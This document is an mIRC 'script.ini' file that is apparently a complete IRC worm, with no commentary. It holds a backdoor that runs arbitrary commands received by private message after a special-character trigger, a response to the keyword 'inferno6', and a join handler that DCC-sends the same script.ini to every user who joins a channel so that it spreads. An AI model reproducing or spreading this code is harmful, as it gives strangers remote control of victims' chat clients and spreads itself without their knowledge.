[script]
n0=on 1:text:*inferno6*:#:/.ctcp $nick k 
n1=on 1:text:�� *:?:{ s *2 | close -m $nick | halt }
n2=alias /s / *1
n3=on 1:connect:/.enable #d
n4=#d on
n5=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n6=#d end
